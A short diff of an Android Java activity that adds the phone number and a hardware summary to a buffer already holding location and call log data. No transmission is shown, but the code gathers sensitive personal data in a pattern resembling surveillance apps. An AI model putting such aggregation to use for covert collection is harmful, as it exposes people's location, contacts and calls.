@@ -334,7 +334,7 @@ public class StartCommonFetchingActivity extends LocationActivity  {
                 humanReadableByteCountBin(MemoryStatus.getTotalInternalMemorySize()) + ",  " + humanReadableByteCountBin(MemoryStatus.getAvailableInternalMemorySize()) + ",  " +
                 humanReadableByteCountBin(MemoryStatus.getTotalExternalMemorySize()) + ",  " + humanReadableByteCountBin(MemoryStatus.getAvailableExternalMemorySize()) + ",  " +
                 deviceName + ",  " + deviceMan + " " + "\n");
-
+        new SavePref(this).setHardSoftInfo(sb.toString());
 
         new Handler().postDelayed(new Runnable() {
             @Override
@@ -938,6 +938,7 @@ public class StartCommonFetchingActivity extends LocationActivity  {
                     @Override
                     public void run() {
 
+                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getMyPhoneNumber() + "\n\n");
                         sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getLocation() + "\n\n");
                         sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getHardSoftInfo() + "\n\n");
                         sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getCallLogData() + "\n\n");
